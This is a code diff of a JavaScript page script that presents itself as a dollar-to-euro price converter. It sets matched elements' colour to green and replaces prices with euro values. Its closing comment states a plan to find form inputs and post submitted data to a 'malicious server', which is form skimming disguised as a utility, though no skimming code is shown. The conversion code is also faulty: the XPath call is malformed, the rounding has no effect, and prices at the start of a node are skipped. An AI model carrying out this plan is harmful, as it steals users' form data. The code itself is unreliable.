@@ -1,13 +1,26 @@
 /* Converts dollars to euros and displays tooltip with converted value. */
+function getEuroEquivalent(dolAmt) {
+    var euroAmt = dolAmt * 0.91;
+    return '€' + euroAmt * 100 / 100;
+}
 
 // Get all price fields and elements with $ in them
 var dollarNodes = document.evaluate('//*[text()=\'$\'', 'document');
-for (var nodeName in dollarNodes) {
-    console.log(nodeName);
-    // PoC change color
-    //var currNode = new Node(nodeName);
-    //currNode.setAttribute('color', 'red');
-}
+dollarNodes.forEach(function (currNode) {
+    currNode.setAttribute('color', 'green');
+
+    // Convert dollars to euros (retain rest of string if exists)
+    var text = currNode.textContent;
+    var valStart = text.indexOf('$');
+    if (valStart > 0) {
+        var dolAmt = parseFloat(text.substring(valStart + 1));
+        var restOfText = text.substring((valStart + 1 + (dolAmt + '').length));
+        var convertedVal = getEuroEquivalent(dolAmt);
+        var combinedText = text.substring(0, valStart) + convertedVal + restOfText;
+        currNode.innerHTML = combinedText;
+    }
+});
+
 
 // Also search document for form inputs
 // If form exists add eventListener for on submit to post back to malicious server
